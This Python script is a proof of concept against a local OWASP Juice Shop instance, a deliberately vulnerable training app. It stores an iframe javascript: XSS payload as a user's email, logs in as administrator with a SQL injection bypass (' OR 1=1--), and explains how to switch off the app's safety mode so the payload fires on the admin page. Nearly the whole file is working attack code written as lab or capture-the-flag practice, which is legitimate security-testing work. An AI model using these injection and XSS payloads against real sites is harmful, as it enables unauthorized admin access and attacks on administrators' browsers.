#!/usr/bin/env python3
"""JUICE-004 - Stored/persisted XSS via user email on the admin page (authorized, local only).

Registers a user through POST /api/Users with an <iframe javascript:> payload as the
email (bypassing the Angular form's client-side validation). The admin user-management
page (/#/administration) renders the email with bypassSecurityTrustHtml, so the stored
payload executes in the administrator's browser on page load.

Note: Juice Shop disables this challenge under Docker and sanitizes the field unless the
instance is started with safety mode off:
    NODE_CONFIG={"challenges":{"safetyMode":"disabled"}}
This script reports whether the payload was stored raw.

Usage:  python juice_004_stored_xss.py [base_url]
        (default base_url: http://localhost:3000)
"""
import sys
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
PAYLOAD = '<iframe src="javascript:alert(xss)">'


def main() -> int:
    reg = requests.post(
        f"{BASE}/api/Users",
        json={"email": PAYLOAD, "password": "xss12345"},
        timeout=15,
    )
    print(f"POST /api/Users  (email=<iframe payload>)  ->  HTTP {reg.status_code}")
    already_exists = reg.status_code == 400 and "unique" in reg.text.lower()
    if reg.status_code not in (200, 201) and not already_exists:
        print("Registration rejected:", reg.text[:200])
        return 1
    if already_exists:
        print("A user with this payload email already exists - verifying it is stored raw.")

    # Log in as admin (via the JUICE-001 SQLi) to read the stored email back.
    login = requests.post(
        f"{BASE}/rest/user/login",
        json={"email": "' OR 1=1--", "password": "x"},
        timeout=15,
    )
    token = login.json()["authentication"]["token"]
    users = requests.get(
        f"{BASE}/api/Users",
        headers={"Authorization": f"Bearer {token}"},
        timeout=15,
    ).json().get("data", [])

    stored_raw = any(isinstance(u.get("email"), str) and "<iframe" in u["email"] for u in users)
    if stored_raw:
        print("Payload stored RAW in a user record.")
        print(f"Now open {BASE}/#/administration as admin - the alert('xss') fires on load.")
        print("JUICE-004 reproduced: persisted XSS via user email on the admin page.")
        return 0

    print("Payload was sanitized (empty email stored).")
    print("Restart the target with safety mode off, e.g.:")
    print('  docker run -d -p 3000:3000 -e \'NODE_CONFIG={"challenges":{"safetyMode":"disabled"}}\' '
          "bkimminich/juice-shop:v17.1.1")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())